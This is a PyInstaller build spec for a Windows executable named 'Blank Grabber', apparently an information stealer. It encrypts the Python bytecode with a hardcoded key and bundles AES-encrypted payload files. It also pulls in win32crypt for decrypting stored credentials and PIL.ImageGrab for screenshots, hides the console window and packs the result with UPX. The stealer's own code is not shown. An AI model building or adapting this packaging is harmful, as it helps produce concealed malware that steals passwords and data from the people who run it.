# -*- mode: python ; coding: utf-8 -*-


block_cipher = pyi_crypto.PyiBlockCipher(key='15785994119915')


a = Analysis(
    ['main-o.py'],
    pathex=[],
    binaries=[],
    datas=[('cm.bam.aes', '.'), ('a.es', '.'), ('config.json', '.'), ('ck.bam.aes', '.'), ('pm.bam.aes', '.')],
    hiddenimports=['requests', 'PIL.Image', 'PIL.ImageGrab', 'PIL.ImageStat', 'pyaes', 'win32crypt', 'json', 'urllib3'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='Blank Grabber',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    version='version.txt',
    icon='NONE',
)
